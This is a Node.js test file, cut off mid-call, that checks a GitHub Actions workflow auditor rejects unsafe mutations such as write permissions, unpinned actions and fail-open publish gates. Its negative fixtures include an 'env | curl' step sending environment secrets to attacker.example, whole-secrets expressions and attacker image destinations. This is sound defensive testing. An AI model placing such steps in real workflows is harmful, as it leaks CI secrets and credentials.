#!/usr/bin/env node

import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import {
  cpSync,
  existsSync,
  mkdtempSync,
  mkdirSync,
  readFileSync,
  realpathSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, resolve, sep } from 'node:path';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { parseDocument } from 'yaml';

import { auditRepository } from './audit-workflows.mjs';

const scriptPath = fileURLToPath(import.meta.url);
const repositoryRoot = resolve(dirname(scriptPath), '../..');
const policyNodeModules = join(repositoryRoot, '.github/scripts/node_modules');

const copyPolicyFixture = (temporaryRoot) => {
  const yamlSource = join(policyNodeModules, 'yaml');
  assert.ok(
    existsSync(join(yamlSource, 'package.json')),
    'run npm ci --ignore-scripts --prefix .github/scripts before the policy tests'
  );
  cpSync(join(repositoryRoot, '.github'), join(temporaryRoot, '.github'), {
    recursive: true,
    filter: (source) =>
      source !== policyNodeModules &&
      !source.startsWith(`${policyNodeModules}${sep}`),
  });
  const fixtureNodeModules = join(
    temporaryRoot,
    '.github/scripts/node_modules'
  );
  mkdirSync(fixtureNodeModules, { recursive: true });
  cpSync(yamlSource, join(fixtureNodeModules, 'yaml'), { recursive: true });
  cpSync(join(repositoryRoot, 'docker'), join(temporaryRoot, 'docker'), {
    recursive: true,
  });
};

const replace = (path, before, after) => {
  const source = readFileSync(path, 'utf8');
  assert.ok(source.includes(before), `test mutation anchor missing in ${path}`);
  writeFileSync(path, source.replace(before, after));
};

const assertRejected = (label, mutate, expectedFinding) => {
  const temporaryRoot = mkdtempSync(join(tmpdir(), 'cannon-workflow-policy-'));
  try {
    copyPolicyFixture(temporaryRoot);
    mutate(temporaryRoot);
    const findings = auditRepository(temporaryRoot);
    assert.ok(
      findings.some((finding) => finding.includes(expectedFinding)),
      `${label}: expected finding containing "${expectedFinding}", got:\n${findings.join(
        '\n'
      )}`
    );
  } finally {
    rmSync(temporaryRoot, { force: true, recursive: true });
  }
};

const assertAccepted = (label, mutate) => {
  const temporaryRoot = mkdtempSync(join(tmpdir(), 'cannon-workflow-policy-'));
  try {
    copyPolicyFixture(temporaryRoot);
    mutate(temporaryRoot);
    assert.deepEqual(
      auditRepository(temporaryRoot),
      [],
      `${label}: reviewed future workflow must remain accepted`
    );
  } finally {
    rmSync(temporaryRoot, { force: true, recursive: true });
  }
};

assert.deepEqual(
  auditRepository(repositoryRoot),
  [],
  'reviewed workflow baseline must pass'
);

{
  const temporaryRoot = mkdtempSync(join(tmpdir(), 'cannon-inventory-policy-'));
  try {
    copyPolicyFixture(temporaryRoot);
    const inventoryPath = join(
      temporaryRoot,
      '.github/runtime-image-inventory.json'
    );
    const originalInventory = readFileSync(inventoryPath, 'utf8');
    const invalidInventory = originalInventory.replace(
      '"status": "active"',
      '"status": "invalid"'
    );
    assert.notEqual(
      invalidInventory,
      originalInventory,
      'real inventory mutation anchor must exist'
    );
    writeFileSync(inventoryPath, invalidInventory);

    const originalDigest = createHash('sha256')
      .update(originalInventory)
      .digest('hex');
    const invalidDigest = createHash('sha256')
      .update(invalidInventory)
      .digest('hex');
    replace(
      join(temporaryRoot, '.github/scripts/audit-workflows.mjs'),
      originalDigest,
      invalidDigest
    );

    const result = spawnSync(
      process.execPath,
      [
        realpathSync(
          join(temporaryRoot, '.github/scripts/audit-workflows.mjs')
        ),
      ],
      {
        cwd: temporaryRoot,
        encoding: 'utf8',
      }
    );
    assert.notEqual(
      result.status,
      0,
      'invalid real inventory must fail even after its policy digest is refreshed'
    );
    assert.doesNotMatch(
      result.stderr,
      /ERR_MODULE_NOT_FOUND|Cannot find package 'yaml'/u,
      'the spawned temporary auditor must resolve its copied policy dependency'
    );
    assert.match(
      result.stderr,
      /runtime image inventory is invalid/u,
      'semantic inventory validation must be the fail-closed boundary'
    );
    assert.doesNotMatch(
      result.stderr,
      /runtime-image-inventory\.json: source must exactly match/u,
      'the fixture must prove rejection independently of the refreshed digest'
    );
  } finally {
    rmSync(temporaryRoot, { force: true, recursive: true });
  }
}

{
  const runtimeWorkflowSource = readFileSync(
    join(repositoryRoot, '.github/workflows/runtime-image-security.yml'),
    'utf8'
  );
  const runtimeWorkflow = parseDocument(runtimeWorkflowSource).toJS();
  const runtimePaths = [
    '.github/scripts/generate-expected-runtime-sbom.sh',
    '.github/scripts/generate-expected-runtime-sbom.test.mjs',
    '.github/scripts/runtime-evidence-paths.test.mjs',
    '.github/scripts/verify-runtime-bundle-input.mjs',
    '.github/scripts/verify-runtime-bundle-input.test.mjs',
  ];
  for (const eventName of ['pull_request', 'push']) {
    for (const path of runtimePaths) {
      assert.ok(
        runtimeWorkflow.on[eventName].paths.includes(path),
        `${eventName} must run when ${path} changes`
      );
    }
  }
  assert.deepEqual(
    runtimeWorkflow.on.workflow_dispatch.inputs.mode.options,
    ['build-current', 'candidate', 'inventory'],
    'manual current-source, single-candidate, and protected-inventory modes must remain distinct'
  );
  assert.equal(
    runtimeWorkflow.concurrency.group,
    "runtime-image-security-${{ github.event_name }}-${{ (github.event_name == 'pull_request' || github.event_name == 'push') && github.ref || github.run_id }}",
    'only replaceable push and pull-request domains may reuse a ref group'
  );
  assert.match(
    runtimeWorkflow.concurrency.group,
    /github\.run_id/u,
    'schedule and workflow_dispatch concurrency groups must be unique per run'
  );
  const cancellationExpression =
    runtimeWorkflow.concurrency['cancel-in-progress'];
  assert.equal(
    cancellationExpression,
    "${{ github.event_name == 'pull_request' || github.event_name == 'push' }}",
    'only replaceable pull-request and push runs may be cancelled'
  );
  const cancellableEvents = [
    ...cancellationExpression.matchAll(/github\.event_name == '([^']+)'/gu),
  ].map((match) => match[1]);
  assert.deepEqual(
    cancellableEvents,
    ['pull_request', 'push'],
    'the parsed cancellation expression must exclude schedule and workflow_dispatch'
  );
  assert.equal(
    runtimeWorkflow.jobs['prepare-exact-digest-scans'].outputs.has_scans,
    '${{ steps.request.outputs.has_scans }}',
    'scheduled inventory must expose an explicit non-matrix emptiness gate'
  );
  assert.equal(
    runtimeWorkflow.jobs['scan-pushed-digest'].if,
    "needs.prepare-exact-digest-scans.outputs.has_scans == 'true'",
    'an all-inactive inventory must skip the exact-digest matrix job before expansion'
  );
  assert.equal(
    runtimeWorkflow.jobs['scan-pushed-digest'].strategy.matrix,
    '${{ fromJSON(needs.prepare-exact-digest-scans.outputs.matrix) }}',
    'exact-digest scans must expand only the validated protected inventory'
  );
  assert.equal(
    runtimeWorkflow.jobs['scan-pushed-digest']['timeout-minutes'],
    45,
    'exact-digest scans must budget for frozen source installation and expected-SBOM generation'
  );
  assert.match(
    runtimeWorkflow.jobs['prepare-exact-digest-scans'].steps.find(
      (step) => step.id === 'request'
    ).run,
    /\$EVENT_NAME" == "schedule" \|\| "\$REQUEST_MODE" == "inventory/u,
    'on-demand inventory mode must resolve the same checked-in inventory as the schedule'
  );
  assert.equal(
    [
      ...runtimeWorkflowSource.matchAll(
        /verify-runtime-image\.sh \\\n\s+"\$IMAGE_REF" \\\n\s+"\$RUNTIME_KIND" \\/gu
      ),
    ].length,
    2,
    'every runtime verifier call must pass the explicit runtime kind'
  );
}

assertAccepted('composed disabled Reya Safe UI workflow', (root) => {
  mkdirSync(join(root, 'packages/reya-safe-ui'), { recursive: true });
  writeFileSync(
    join(root, 'packages/reya-safe-ui/package.json'),
    '{"name":"@usecannon/reya-safe-ui","private":true}\n'
  );
  writeFileSync(
    join(root, '.github/workflows/reya-safe-ui.yml'),
    [
      'name: Reya Safe UI',
      'on:',
      '  pull_request:',
      '    branches: [dev, main]',
      '  push:',
      '    branches: [dev, main]',
      '  workflow_dispatch:',
      'permissions:',
      '  contents: read',
      'jobs:',
      '  reya-safe-ui:',
      '    runs-on: ubuntu-24.04',
      '    timeout-minutes: 10',
      '    concurrency:',
      '      group: reya-safe-ui-${{ github.event.pull_request.number || github.run_id }}',
      "      cancel-in-progress: ${{ github.event_name == 'pull_request' }}",
      '    steps:',
      '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1',
      '        with:',
      '          persist-credentials: false',
      '      - uses: pnpm/action-setup@0ebf47130e4866e96fce0953f49152a61190b271',
      '      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020',
      '      - run: pnpm --dir packages/reya-safe-ui test',
      '        env:',
      '          REYA_SAFE_UI_BUILD_SHA: ${{ github.sha }}',
      '      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02',
      '',
    ].join('\n')
  );
});

assertRejected(
  'deleted composed Reya Safe UI workflow',
  (root) => {
    mkdirSync(join(root, 'packages/reya-safe-ui'), { recursive: true });
    writeFileSync(
      join(root, 'packages/reya-safe-ui/package.json'),
      '{"name":"@usecannon/reya-safe-ui","private":true}\n'
    );
    rmSync(join(root, '.github/workflows/reya-safe-ui.yml'), { force: true });
  },
  'reya-safe-ui.yml: required workflow is missing'
);

assertRejected(
  'write permission',
  (root) =>
    replace(
      join(root, '.github/workflows/lint.yml'),
      'permissions:\n  contents: read',
      'permissions:\n  contents: write'
    ),
  'permissions must be exactly contents: read'
);

assertRejected(
  'flow-style floating action',
  (root) =>
    replace(
      join(root, '.github/workflows/lint.yml'),
      '      - run: pnpm i --frozen-lockfile',
      '      - { uses: actions/cache@v4 }\n      - run: pnpm i --frozen-lockfile'
    ),
  'action is not pinned to a full commit SHA'
);

assertRejected(
  'bracket secret reference',
  (root) =>
    replace(
      join(root, '.github/workflows/lint.yml'),
      '      - run: pnpm i --frozen-lockfile',
      "      - run: pnpm i --frozen-lockfile\n        env:\n          LEAK: ${{ secrets['TOKEN'] }}"
    ),
  'repository secret reference is forbidden'
);

assertRejected(
  'bracket GitHub token reference',
  (root) =>
    replace(
      join(root, '.github/workflows/lint.yml'),
      '      - run: pnpm i --frozen-lockfile',
      "      - run: pnpm i --frozen-lockfile\n        env:\n          TOKEN: ${{ github['token'] }}"
    ),
  'unreviewed GitHub context reference is forbidden'
);

assertRejected(
  'whole GitHub context reference',
  (root) =>
    replace(
      join(root, '.github/workflows/lint.yml'),
      '      - run: pnpm i --frozen-lockfile',
      '      - run: pnpm i --frozen-lockfile\n        env:\n          CONTEXT: ${{ toJSON(github) }}'
    ),
  'unreviewed GitHub context reference is forbidden'
);

assertRejected(
  'computed GitHub token reference',
  (root) =>
    replace(
      join(root, '.github/workflows/lint.yml'),
      '      - run: pnpm i --frozen-lockfile',
      "      - run: pnpm i --frozen-lockfile\n        env:\n          TOKEN: ${{ github[format('{0}', 'token')] }}"
    ),
  'unreviewed GitHub context reference is forbidden'
);

assertRejected(
  'delimiter-in-string computed GitHub token reference',
  (root) =>
    replace(
      join(root, '.github/workflows/lint.yml'),
      '      - run: pnpm i --frozen-lockfile',
      "      - run: pnpm i --frozen-lockfile\n        env:\n          TOKEN: ${{ format('}}{0}', github[format('{0}', 'token')]) }}"
    ),
  'unreviewed GitHub context reference is forbidden'
);

assertRejected(
  'local composite action escape',
  (root) => {
    const actionDirectory = join(root, '.github/actions/escape');
    mkdirSync(actionDirectory, { recursive: true });
    writeFileSync(
      join(actionDirectory, 'action.yml'),
      [
        'name: Escape',
        'description: Negative policy fixture',
        'runs:',
        '  using: composite',
        '  steps:',
        '    - uses: actions/cache@v4',
        '',
      ].join('\n')
    );
    replace(
      join(root, '.github/workflows/lint.yml'),
      '      - run: pnpm i --frozen-lockfile',
      '      - uses: ./.github/actions/escape\n      - run: pnpm i --frozen-lockfile'
    );
  },
  'action is not pinned to a full commit SHA'
);

assertRejected(
  'manual trigger',
  (root) =>
    replace(
      join(root, '.github/workflows/lint.yml'),
      'on:\n  push:',
      'on:\n  workflow_dispatch:\n  push:'
    ),
  'events must be exactly'
);

assertRejected(
  'unreviewed workflow',
  (root) =>
    writeFileSync(
      join(root, '.github/workflows/publish.yml'),
      [
        'name: Publish',
        'on:',
        '  workflow_dispatch:',
        'permissions:',
        '  packages: write',
        'jobs:',
        '  publish:',
        '    runs-on: ubuntu-24.04',
        '    timeout-minutes: 5',
        '    steps:',
        '      - run: echo publish',
        '',
      ].join('\n')
    ),
  'workflow is not in the reviewed allowlist'
);

assertRejected(
  'unpinned service image',
  (root) =>
    replace(
      join(root, '.github/workflows/safe-app-backend.yml'),
      'redis:7.4.2-alpine@sha256:02419de7eddf55aa5bcf49efb74e88fa8d931b4d77c07eff8a6b2144472b6952',
      'redis:7.4.2-alpine'
    ),
  'container image is not digest-pinned'
);

assertRejected(
  'persisted checkout credentials',
  (root) =>
    replace(
      join(root, '.github/workflows/lint.yml'),
      'persist-credentials: false',
      'persist-credentials: true'
    ),
  'checkout must set persist-credentials: false'
);

assertRejected(
  'additional publisher permission',
  (root) =>
    replace(
      join(root, '.github/workflows/safe-app-backend-publish.yml'),
      '      packages: write\n',
      '      packages: write\n      issues: write\n'
    ),
  'publisher job permissions must match'
);

assertRejected(
  'fail-open publisher gate',
  (root) =>
    replace(
      join(root, '.github/workflows/safe-app-backend-publish.yml'),
      "vars.CANNON_SAFE_PUBLISH_ENABLED == 'true'",
      "vars.CANNON_SAFE_PUBLISH_ENABLED != 'false'"
    ),
  'Publisher workflow differs from the exact reviewed schema'
);

assertRejected(
  'publisher reusable workflow substitution',
  (root) =>
    replace(
      join(root, '.github/workflows/safe-app-backend-publish.yml'),
      'uses: ./.github/workflows/safe-app-backend.yml',
      'uses: ./.github/workflows/lint.yml'
    ),
  'exact read-only call to the reviewed reusable workflow'
);

assertRejected(
  'publisher action substitution',
  (root) =>
    replace(
      join(root, '.github/workflows/safe-app-backend-publish.yml'),
      'docker/setup-buildx-action@bb05f3f5519dd87d3ba754cc423b652a5edd6d2c',
      'docker/setup-qemu-action@c7c53464625b32c7a7e944ae62b3e17d2b600130'
    ),
  'Publisher workflow differs from the exact reviewed schema'
);

assertRejected(
  'publisher image destination substitution',
  (root) =>
    replace(
      join(root, '.github/workflows/safe-app-backend-publish.yml'),
      'IMAGE_NAME: ghcr.io/reya-labs/safe-app-backend',
      'IMAGE_NAME: ghcr.io/attacker/safe-app-backend'
    ),
  'Publisher workflow differs from the exact reviewed schema'
);

assertRejected(
  'publisher registry substitution',
  (root) =>
    replace(
      join(root, '.github/workflows/safe-app-backend-publish.yml'),
      '          registry: ghcr.io',
      '          registry: r.example'
    ),
  'Publisher workflow differs from the exact reviewed schema'
);

assertRejected(
  'arbitrary publisher run step',
  (root) =>
    replace(
      join(root, '.github/workflows/safe-app-backend-publish.yml'),
      '      - uses: docker/setup-buildx-action@',
      '      - run: env | curl --data-binary @- https://attacker.example\n' +
        '      - uses: docker/setup-buildx-action@'
    ),
  'Publisher workflow differs from the exact reviewed schema'
);

assertRejected(
  'whole publisher secrets context',
  (root) =>
    replace(
      join(root, '.github/workflows/safe-app-backend-publish.yml'),
      '${{ secrets.GITHUB_TOKEN }}',
      '${{ toJSON(secrets) }}'
    ),
  'whole or computed secrets contexts'
);

assertRejected(
  'fail-open runtime publisher gate',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-publish.yml'),
      "vars.CANNON_RUNTIME_PUBLISH_ENABLED == 'true'",
      "vars.CANNON_RUNTIME_PUBLISH_ENABLED != 'false'"
    ),
  'source must exactly match the reviewed workflow digest'
);

assertRejected(
  'runtime publisher validation substitution',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-publish.yml'),
      'uses: ./.github/workflows/runtime-image-security.yml',
      'uses: ./.github/workflows/lint.yml'
    ),
  'validation must be the exact protected-dev, read-only runtime security call'
);

assertRejected(
  'runtime publisher image destination substitution',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-publish.yml'),
      'image_name: ghcr.io/reya-labs/repo',
      'image_name: ghcr.io/attacker/repo'
    ),
  'publisher job must match the reviewed protected-dev matrix'
);

assertRejected(
  'runtime publisher mutable tag',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-publish.yml'),
      '${{ env.IMAGE_NAME }}:${{ env.SOURCE_REVISION }}',
      '${{ env.IMAGE_NAME }}:latest'
    ),
  'source must exactly match the reviewed workflow digest'
);

assertRejected(
  'runtime publisher without environment gate',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-publish.yml'),
      '    environment: cannon-image-publish\n',
      ''
    ),
  'publisher job must match the reviewed protected-dev matrix'
);

assertRejected(
  'runtime publisher whole secrets context',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-publish.yml'),
      '${{ secrets.GITHUB_TOKEN }}',
      '${{ toJSON(secrets) }}'
    ),
  'publisher must consume only one explicit secrets.GITHUB_TOKEN reference'
);

assertRejected(
  'runtime publisher action substitution',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-publish.yml'),
      'docker/setup-buildx-action@bb05f3f5519dd87d3ba754cc423b652a5edd6d2c',
      'docker/setup-qemu-action@c7c53464625b32c7a7e944ae62b3e17d2b600130'
    ),
  'publisher actions must exactly match the reviewed pinned set'
);

assertRejected(
  'continued failure',
  (root) =>
    replace(
      join(root, '.github/workflows/lint.yml'),
      '      - run: pnpm i --frozen-lockfile',
      '      - run: pnpm i --frozen-lockfile\n        continue-on-error: true'
    ),
  'continue-on-error is forbidden'
);

assertRejected(
  'deleted runtime security workflow',
  (root) =>
    rmSync(join(root, '.github/workflows/runtime-image-security.yml'), {
      force: true,
    }),
  'runtime-image-security.yml: required workflow is missing'
);

assertRejected(
  'deleted runtime publisher workflow',
  (root) =>
    rmSync(join(root, '.github/workflows/runtime-publish.yml'), {
      force: true,
    }),
  'runtime-publish.yml: required workflow is missing'
);

assertRejected(
  'runtime scan schedule drift',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      "    - cron: '23 6 * * 1'",
      "    - cron: '23 6 * * 2'"
    ),
  'schedule must exactly match the reviewed configuration'
);

assertRejected(
  'runtime concurrency collapses schedule and push domains',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      "  group: runtime-image-security-${{ github.event_name }}-${{ (github.event_name == 'pull_request' || github.event_name == 'push') && github.ref || github.run_id }}",
      '  group: runtime-image-security-${{ github.ref }}'
    ),
  'concurrency must use unique schedule/manual run IDs'
);

assertRejected(
  'runtime manual and scheduled scans reuse a replaceable ref group',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      "  group: runtime-image-security-${{ github.event_name }}-${{ (github.event_name == 'pull_request' || github.event_name == 'push') && github.ref || github.run_id }}",
      '  group: runtime-image-security-${{ github.event_name }}-${{ github.ref }}'
    ),
  'concurrency must use unique schedule/manual run IDs'
);

assertRejected(
  'runtime schedule and manual scans become cancellable',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      "  cancel-in-progress: ${{ github.event_name == 'pull_request' || github.event_name == 'push' }}",
      '  cancel-in-progress: true'
    ),
  'ref-group cancellation only for replaceable pull-request or push runs'
);

assertRejected(
  'runtime evidence manifest is written inside its scanned directory',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      '          manifest_temp="$(mktemp "${evidence_directory}.SHA256SUMS.XXXXXX")"\n',
      '          manifest_temp="${evidence_directory}/SHA256SUMS"\n'
    ),
  'evidence manifests must be verified through unique same-filesystem sibling files'
);

assertRejected(
  'runtime on-demand inventory mode bypass',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      'if [[ "$EVENT_NAME" == "schedule" || "$REQUEST_MODE" == "inventory" ]]',
      'if [[ "$EVENT_NAME" == "schedule" ]]'
    ),
  'on-demand inventory modes must resolve the same protected inventory'
);

assertRejected(
  'runtime expected-SBOM generator missing from pull-request paths',
  (root) => {
    const workflowPath = join(
      root,
      '.github/workflows/runtime-image-security.yml'
    );
    replace(
      workflowPath,
      "      - '.github/scripts/generate-expected-runtime-sbom.sh'\n",
      ''
    );
  },
  'pull_request must exactly match the reviewed configuration'
);

assertRejected(
  'runtime expected closure uses mutable archive head',
  (root) =>
    replace(
      join(root, '.github/scripts/generate-expected-runtime-sbom.sh'),
      'git -C "$source_directory" archive --format=tar "$expected_revision"',
      'git -C "$source_directory" archive --format=tar HEAD'
    ),
  'expected closure must be generated from the exact declared checked-out source revision'
);

assertRejected(
  'runtime expected closure executes source pnpm hooks',
  (root) =>
    replace(
      join(root, '.github/scripts/generate-expected-runtime-sbom.sh'),
      '      --ignore-pnpmfile \\\n',
      ''
    ),
  'must ignore source-controlled pnpm hooks'
);

assertRejected(
  'runtime expected closure inventory executes a configured pnpm hook',
  (root) =>
    replace(
      join(root, '.github/scripts/generate-expected-runtime-sbom.sh'),
      '      --config.ignore-pnpmfile=true \\\n',
      ''
    ),
  'must ignore source-controlled pnpm hooks'
);

assertRejected(
  'runtime pnpm-hook adversarial test removed',
  (root) =>
    replace(
      join(root, '.github/workflows/supply-chain.yml'),
      '      - run: node .github/scripts/generate-expected-runtime-sbom.test.mjs\n',
      ''
    ),
  'source-controlled pnpm-hook isolation test must remain enforced'
);

assertRejected(
  'runtime evidence path adversarial test removed',
  (root) =>
    replace(
      join(root, '.github/workflows/supply-chain.yml'),
      '      - run: node .github/scripts/runtime-evidence-paths.test.mjs\n',
      ''
    ),
  'runtime evidence path isolation test must remain enforced'
);

assertRejected(
  'runtime scanner reuses an attacker-controlled output directory',
  (root) =>
    replace(
      join(root, '.github/scripts/scan-runtime-image.sh'),
      'mkdir -m 0700 "$output_directory"',
      'mkdir -p "$output_directory"'
    ),
  'fresh, distinct regular files'
);

assertRejected(
  'runtime scanner drops pairwise output identity checks',
  (root) =>
    replace(
      join(root, '.github/scripts/scan-runtime-image.sh'),
      'require_distinct_outputs "$expected_bundle_sbom" "$bundle_sbom"',
      'require_regular_output "$bundle_sbom"'
    ),
  'fresh, distinct regular files'
);

assertRejected(
  'runtime expected closure reuses an attacker-controlled output directory',
  (root) =>
    replace(
      join(root, '.github/scripts/generate-expected-runtime-sbom.sh'),
      'mkdir -m 0700 "$output_parent"',
      'mkdir -p "$output_parent"'
    ),
  'expected closure generation must use a fresh output directory'
);

assertRejected(
  'runtime expected closure retains source-only npm configuration',
  (root) =>
    replace(
      join(root, '.github/scripts/generate-expected-runtime-sbom.sh'),
      '  \\( -name .npmrc -o -name .pnpmfile.cjs -o -name pnpmfile.cjs \\) \\\n',
      '  -name .never-matches \\\n'
    ),
  'must ignore source-controlled pnpm hooks'
);

assertRejected(
  'current-source expected closure generation removed',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      '.github/scripts/generate-expected-runtime-sbom.sh \\\n',
      'true # generate-expected-runtime-sbom.sh \\\n'
    ),
  'current-source expected closure must use the exact build revision'
);

assertRejected(
  'pushed-digest expected closure trusts candidate policy',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      'policy/.github/scripts/generate-expected-runtime-sbom.sh \\\n',
      'source/.github/scripts/generate-expected-runtime-sbom.sh \\\n'
    ),
  'pushed-digest expected closure must use trusted policy and the exact image source revision'
);

assertRejected(
  'current-source scan omits independent expected closure',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      '            "$EVIDENCE_DIRECTORY" \\\n' +
        '            "$expected_bundle_input"',
      '            "$EVIDENCE_DIRECTORY" \\\n' + '            absent'
    ),
  'current-source scan must receive the independent expected closure'
);

assertRejected(
  'current-source evidence is written inside the untrusted checkout',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      'evidence_directory="${RUNNER_TEMP}/cannon-runtime-security-${RUNTIME_KIND}"',
      'evidence_directory="runtime-security-${RUNTIME_KIND}"'
    ),
  'evidence must stay in fresh runner-temporary directories outside the source checkout'
);

assertRejected(
  'runtime bundle-input equality verifier removed',
  (root) =>
    replace(
      join(root, '.github/scripts/scan-runtime-image.sh'),
      '    node "$bundle_input_verifier" "$expected_bundle_sbom" "$bundle_sbom"\n',
      '    node -e "process.stdout.write(\\"unchecked\\\\n\\")"\n'
    ),
  'NCC evidence must exactly match an independently generated retained source closure'
);

assertRejected(
  'runtime bundle-input verifier policy substitution',
  (root) =>
    replace(
      join(root, '.github/scripts/verify-runtime-bundle-input.mjs'),
      'if (!expected.equals(embedded)) {',
      'if (false) {'
    ),
  'source must exactly match the reviewed policy digest'
);

assertRejected(
  'arbitrary runtime workflow step',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      '      - name: Resolve immutable image metadata',
      '      - run: curl https://attacker.example\\n' +
        '      - name: Resolve immutable image metadata'
    ),
  'source must exactly match the reviewed workflow digest'
);

assertRejected(
  'runtime digest scanner package write permission',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      '      packages: read',
      '      packages: write'
    ),
  'permissions must be exactly attestations: read, contents: read, and packages: read'
);

assertRejected(
  'runtime digest scanner broader permission',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      '      packages: read',
      '      packages: read\n      issues: read'
    ),
  'permissions must be exactly attestations: read, contents: read, and packages: read'
);

assertRejected(
  'runtime digest scanner without attestation permission',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      '      attestations: read\n',
      ''
    ),
  'permissions must be exactly attestations: read, contents: read, and packages: read'
);

assertRejected(
  'runtime verifier network sandbox relaxation',
  (root) =>
    replace(
      join(root, '.github/scripts/verify-runtime-image.sh'),
      '  --network none \\\n',
      '  --network bridge \\\n'
    ),
  'source must exactly match the reviewed policy digest'
);

assertRejected(
  'runtime verifier skips default entry syntax validation',
  (root) =>
    replace(
      join(root, '.github/scripts/verify-runtime-image.sh'),
      '  node --check "/usr/app/${EXPECTED_ENTRY_FILE}"\n',
      ''
    ),
  'source must exactly match the reviewed policy digest'
);

assertRejected(
  'runtime scanner substitution',
  (root) =>
    replace(
      join(root, '.github/scripts/scan-runtime-image.sh'),
      'fd4ab4d1042b522c896e73bdf09ab8bf384fa417df99d6dd0d6e1008c7e7c821',
      'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
    ),
  'source must exactly match the reviewed policy digest'
);

assertRejected(
  'runtime bundle-input inventory relaxation',
  (root) =>
    replace(
      join(root, '.github/scripts/generate-bundle-input-sbom.mjs'),
      'if (components.size === 0) {\n',
      'if (components.size < 0) {\n'
    ),
  'source must exactly match the reviewed policy digest'
);

assertRejected(
  'runtime digest scan from an untrusted workflow repository',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      '          test "$TRUSTED_REPOSITORY" = "Reya-Labs/cannon"',
      '          test -n "$TRUSTED_REPOSITORY"'
    ),
  'source must exactly match the reviewed workflow digest'
);

assertRejected(
  'runtime digest scan without protected-dev attestation source',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      '            --source-ref "$TRUSTED_REF" \\\n',
      ''
    ),
  'source must exactly match the reviewed workflow digest'
);

assertRejected(
  'runtime digest scan without approved signer workflow binding',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      '            --signer-workflow "$SIGNER_WORKFLOW" \\\n',
      ''
    ),
  'source must exactly match the reviewed workflow digest'
);

assertRejected(
  'runtime digest scan with substituted signer workflow',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      'Reya-Labs/cannon/.github/workflows/safe-app-backend-publish.yml',
      'Reya-Labs/cannon/.github/workflows/runtime-image-security.yml'
    ),
  'source must exactly match the reviewed workflow digest'
);

assertRejected(
  'runtime digest scan without signer revision binding',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      '            --signer-digest "$SIGNER_DIGEST" \\\n',
      ''
    ),
  'source must exactly match the reviewed workflow digest'
);

assertRejected(
  'scheduled digest scan bypasses protected inventory',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      '                .github/runtime-image-inventory.json',
      '                /tmp/unreviewed-runtime-image-inventory.json'
    ),
  'source must exactly match the reviewed workflow digest'
);

assertRejected(
  'empty scheduled inventory expands as an invalid matrix',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      "    if: needs.prepare-exact-digest-scans.outputs.has_scans == 'true'",
      '    if: always()'
    ),
  'source must exactly match the reviewed workflow digest'
);

assertRejected(
  'runtime inventory policy substitution',
  (root) =>
    replace(
      join(root, '.github/runtime-image-inventory.json'),
      '"status": "active"',
      '"status": "inactive"'
    ),
  'source must exactly match the reviewed policy digest'
);

assertRejected(
  'runtime publisher mapping substitution',
  (root) =>
    replace(
      join(root, '.github/scripts/validate-runtime-image-inventory.mjs'),
      'Reya-Labs/cannon/.github/workflows/safe-app-backend-publish.yml',
      'Reya-Labs/cannon/.github/workflows/runtime-image-security.yml'
    ),
  'source must exactly match the reviewed policy digest'
);

assertRejected(
  'missing final bundle-input evidence copy',
  (root) =>
    replace(
      join(root, 'docker/repo.Dockerfile'),
      'COPY --from=build /usr/app/bundle-input-dependencies.cdx.json ./bundle-input-dependencies.cdx.json\n',
      ''
    ),
  'bundle-input evidence must be generated once'
);

assertRejected(
  'repository OCI license substitution',
  (root) =>
    replace(
      join(root, 'docker/repo.Dockerfile'),
      'org.opencontainers.image.licenses="GPL-3.0-or-later"',
      'org.opencontainers.image.licenses="MIT"'
    ),
  'OCI license must match the bundled GPL-3.0-or-later repository service'
);

assertRejected(
  'artifact codec ownership narrowed to its manifest',
  (root) =>
    replace(
      join(root, '.github/CODEOWNERS'),
      '/packages/artifact-codec/ @arturbeg @bogdan-reya',
      '/packages/artifact-codec/package.json @arturbeg @bogdan-reya'
    ),
  'persisted CID authority must be protected by the reviewed artifact-codec owners'
);

assertRejected(
  'alternate bundle-input evidence output path',
  (root) =>
    replace(
      join(root, 'docker/indexer.Dockerfile'),
